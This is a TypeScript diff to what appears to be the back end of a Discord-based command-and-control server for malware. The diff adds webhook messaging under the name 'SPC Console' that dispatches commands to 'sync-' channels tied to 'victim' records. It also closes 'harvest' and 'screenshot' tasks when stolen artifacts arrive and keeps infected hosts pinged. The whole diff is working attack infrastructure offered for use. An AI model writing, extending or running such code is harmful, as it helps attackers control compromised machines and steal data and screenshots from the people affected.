@@ -201,7 +201,10 @@ async function ensureLinks(): Promise<void> {
   for (const channel of channels) {
     if (!channel.name.startsWith('sync-')) continue;
     const existing = await prisma.discordLink.findUnique({ where: { channelId: channel.id } });
-    if (existing) continue;
+    if (existing) {
+      if (!existing.webhookUrl) await ensureWebhook(existing.id, existing.channelId);
+      continue;
+    }
     const raw = channel.name.replace(/^sync-shared-/, '').replace(/^sync-/, '');
     const split = raw.lastIndexOf('-');
     const hostname = (split > 0 ? raw.slice(0, split) : raw).slice(0, 100) || 'discord-host';
@@ -221,10 +224,51 @@ async function ensureLinks(): Promise<void> {
         deviceTokenEnc: sealSecret(randomToken(32))
       }
     });
-    await prisma.discordLink.create({ data: { channelId: channel.id, guildId, victimId: victim.id } });
+    const created = await prisma.discordLink.create({ data: { channelId: channel.id, guildId, victimId: victim.id } });
+    await ensureWebhook(created.id, channel.id);
     await prisma.event.create({ data: { victimId: victim.id, kind: 'discord_link', data: { channelId: channel.id } } });
     await publish({ type: 'victim.new', victimId: victim.id, at: Date.now(), data: { hostname, transport: 'discord' } });
     log(`linked ${channel.name} -> ${victim.id}`);
+  }
+}
+
+async function ensureWebhook(linkId: string, channelId: string): Promise<string | null> {
+  try {
+    const hooks = await rest<Array<{ id: string; token?: string; name: string }>>('GET', `/channels/${channelId}/webhooks`);
+    let hook = hooks.find((item) => item.name === 'SPC Console' && item.token);
+    if (!hook) {
+      hook = await rest<{ id: string; token: string; name: string }>('POST', `/channels/${channelId}/webhooks`, { name: 'SPC Console' });
+    }
+    if (!hook?.token) return null;
+    const url = `https://discord.com/api/webhooks/${hook.id}/${hook.token}`;
+    await prisma.discordLink.update({ where: { id: linkId }, data: { webhookUrl: url } });
+    return url;
+  } catch (error) {
+    lastError = error instanceof Error ? error.message : 'webhook_failed';
+    return null;
+  }
+}
+
+async function send(link: { id: string; channelId: string; webhookUrl: string | null }, content: string): Promise<string | null> {
+  try {
+    if (!link.webhookUrl) {
+      const created = await ensureWebhook(link.id, link.channelId);
+      if (!created) return null;
+      link.webhookUrl = created;
+    }
+    const response = await fetch(`${link.webhookUrl}?wait=true`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ content, username: 'SPC Console', allowed_mentions: { parse: [] } })
+    });
+    if (!response.ok) throw new Error(`webhook ${response.status}`);
+    const message = (await response.json()) as Message;
+    outbound.add(message.id);
+    return message.id;
+  } catch (error) {
+    lastError = error instanceof Error ? error.message : 'webhook_send_failed';
+    link.webhookUrl = null;
+    return null;
   }
 }
 
@@ -388,6 +432,13 @@ async function ingestFile(link: { channelId: string; victimId: string }, externa
     }
   });
   await prisma.event.create({ data: { victimId: link.victimId, kind: 'artifact_received', data: { name, bytes: info.size, module } } });
+  const taskName = module === 'harvest' ? 'harvest' : module === 'screenshot' ? 'screenshot' : '';
+  if (taskName) {
+    await prisma.task.updateMany({
+      where: { victimId: link.victimId, name: taskName, status: 'running' },
+      data: { status: 'done', result: { artifactId: artifact.id } as never, finishedAt: new Date(), leaseUntil: null }
+    });
+  }
   await processArtifact(artifact.id);
 }
 
@@ -399,20 +450,18 @@ async function dispatchTasks(): Promise<void> {
     include: { victim: { include: { discord: true } } }
   });
   for (const task of tasks) {
-    const channel = task.victim.discord?.channelId;
-    if (!channel) continue;
+    const link = task.victim.discord;
+    if (!link) continue;
+    const channel = link.channelId;
     const text = commandFor(task.name, task.params as Record<string, unknown>);
     if (!text) continue;
     try {
-      const message = await rest<Message>('POST', `/channels/${channel}/messages`, {
-        content: text,
-        allowed_mentions: { parse: [] }
-      });
+      const messageId = await send(link, text);
+      if (!messageId) throw new Error('webhook_unavailable');
       await prisma.task.update({
         where: { id: task.id },
-        data: { status: 'running', leaseUntil: new Date(Date.now() + task.timeoutSec * 1000), attempts: { increment: 1 }, discordMessageId: message.id }
+        data: { status: 'running', leaseUntil: new Date(Date.now() + task.timeoutSec * 1000), attempts: { increment: 1 }, discordMessageId: messageId }
       });
-      outbound.add(message.id);
       lastPing.set(channel, Date.now());
     } catch (error) {
       await prisma.task.update({ where: { id: task.id }, data: { error: error instanceof Error ? error.message : 'send_failed' } });
@@ -441,9 +490,8 @@ async function maybePing(): Promise<void> {
   for (const link of links) {
     if (now - (lastPing.get(link.channelId) ?? 0) < PING_MS) continue;
     try {
-      const msg = await rest<Message>('POST', `/channels/${link.channelId}/messages`, { content: 'ping', allowed_mentions: { parse: [] } });
-      outbound.add(msg.id);
-      lastPing.set(link.channelId, now);
+      const id = await send(link, 'ping');
+      if (id) lastPing.set(link.channelId, now);
     } catch {
       // channel lost
     }
